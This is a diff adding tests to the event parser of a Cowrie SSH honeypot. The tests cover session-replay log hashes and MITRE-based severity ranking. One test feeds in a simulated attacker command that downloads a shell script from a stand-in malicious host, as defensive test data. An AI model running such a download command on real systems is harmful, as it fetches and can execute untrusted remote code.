@@ -25,6 +25,7 @@ from conftest import (
     make_command_event,
     make_connect_event,
     make_kex_event,
+    make_log_closed_event,
     make_login_failed_event,
     make_login_success_event,
     wait_until,
@@ -99,6 +100,23 @@ class TestParseEventCore:
 
         assert "sessX" not in target.SESSION_CACHE
 
+    def test_ttylog_hash_extracted_as_basename_for_session_replay(self, target):
+        # cowrie.log.closed is what session replay (parser/main.py's
+        # /api/sessions/{id}/replay) is keyed off of - only the sha256
+        # basename should be kept, never Cowrie's full on-disk path.
+        doc = target.parse_event(
+            make_log_closed_event(session="sessY", ttylog_hash="b" * 64)
+        )
+
+        assert doc is not None
+        assert doc["event"] == "cowrie.log.closed"
+        assert doc["session"] == "sessY"
+        assert doc["ttylog"] == "b" * 64
+
+    def test_ttylog_field_absent_on_unrelated_events(self, target):
+        doc = target.parse_event(make_login_failed_event())
+        assert doc["ttylog"] is None
+
     def test_pl08_duplicate_events_are_not_deduplicated(self, target):
         """Pins down CURRENT behaviour: there is no content-based dedup
         anywhere in this pipeline. Sending the exact same failed-login line
@@ -130,6 +148,27 @@ class TestParseEventCore:
     def test_events_outside_important_events_return_none(self, target):
         assert target.parse_event(make_client_version_event()) is None
         assert target.parse_event(make_kex_event()) is None
+
+    def test_pl15_severity_field_reflects_mitre_technique_severity(self, target):
+        """severity is derived from mitre_techniques (see severity.py) -
+        pinned here on both modules so log_watcher.py and parser.py can't
+        drift apart on it the way parser.py's copy briefly did (no
+        `severity` key at all) before this test existed."""
+        failed_doc = target.parse_event(make_login_failed_event())
+        assert failed_doc["severity"] == "low"  # T1110 alone
+
+        success_doc = target.parse_event(make_login_success_event())
+        assert success_doc["severity"] == "high"  # T1110 + T1078, max wins
+
+        download_doc = target.parse_event(
+            make_command_event(command="wget http://evil.example/x.sh")
+        )
+        assert download_doc["severity"] == "high"  # T1105
+
+    def test_pl15b_severity_defaults_to_low_when_no_technique_matches(self, target):
+        # cowrie.session.connect maps to T1021.004, itself ranked LOW.
+        doc = target.parse_event(make_connect_event())
+        assert doc["severity"] == "low"
 
 
 # ---------------------------------------------------------------------------
